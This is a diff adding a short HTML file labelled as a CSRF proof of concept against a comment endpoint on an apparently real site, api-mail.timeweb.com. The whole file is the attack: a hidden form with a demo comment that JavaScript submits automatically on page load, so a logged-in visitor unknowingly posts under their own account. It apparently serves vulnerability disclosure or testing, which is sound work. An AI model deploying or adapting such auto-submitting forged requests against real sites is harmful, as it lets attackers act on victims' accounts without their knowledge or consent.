@@ -1,0 +1,13 @@
+<html>
+  <!-- CSRF PoC - works using standard form submission -->
+  <body>
+    <form action="https://api-mail.timeweb.com/news/item/91/comment" method="POST">
+      <input type="hidden" name="comment" value="This is demo99">
+      <input type="hidden" name="replyTo" value="0">
+      <input type="submit" value="Submit request">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
